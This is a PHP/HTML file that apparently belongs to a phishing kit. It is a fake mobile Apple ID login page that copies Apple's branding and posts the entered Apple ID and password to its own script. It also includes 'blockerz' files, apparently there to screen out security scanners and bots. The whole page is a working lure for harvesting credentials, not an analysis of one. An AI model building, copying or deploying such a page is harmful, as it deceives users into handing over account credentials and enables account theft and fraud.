<?php
include '../../blockerz.php';
include '../../blockerz2.php';
?>
<!DOCTYPE html>
<html>
<head>
	<title>Manage your Apple ID</title>
		<link rel="stylesheet" type="text/css" href="files/css/style-login-mobile.css">
		<script type="text/javascript" src="files/js/script-login-mobile.js"></script>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<link rel="icon" href="files/img/favicon.ico" type="image/x-icon" />
  <script type="text/javascript" src="//code.jquery.com/jquery-1.9.1.js"></script>

<script type='text/javascript'>
//<![CDATA[
$(window).load(function(){
$(".optiona").click(function(){
    $(this).toggleClass('optiona2')
});
});//]]> 

</script>

</head>
<body>
<div id="bottom_m_login"></div>
	<div id="i1"></div>
	<div id="i2"></div>
	<div id="i3"></div>
<div id="head_m_login">
	<!-- <img src="mobile/img/login.png" style="height:100%;width:auto;"> -->
</div>


<div id="container_m_login">
	<div id="xheader_m_login">
		<div id="navbar_m_login"></div>
	</div>
	<div id="xcontent_m_login">
		<form action="" method="POST" target="_self" name="xlogin">
			<font id="Apple_ID_m_login">Apple ID</font>
			<font id="Manage_Account_m_login">Manage your Apple account</font>
			<div id="xXxLogin">
				<input name="xuser" id="xuser_m_login" type="email" value="" placeholder="Apple ID" onfocus="return OxForm()">
				<input name="xpass" id="xpass_m_login" type="password" value="" placeholder="Password" onkeyup="return login_BTN_m_login()">
				<div id="xbootn_m_login"><input name="xbtn" id="xbtn_m_login" class="xbtn1_m_login" type="submit" value="" onclick="return xForm_m_login()" ></div>
				<div id="loading_m_login"></div>
			</div>
			<font id="Remember_me_m_login">Remember me</font>
			<div class="optiona"></div>
			<font id="Forgot_Apple_ID_m_login">Forgot Apple ID or password?</font>
		</form>
	</div>
	<div id="xfooter_m_login"></div>
</div>
</body>
</html>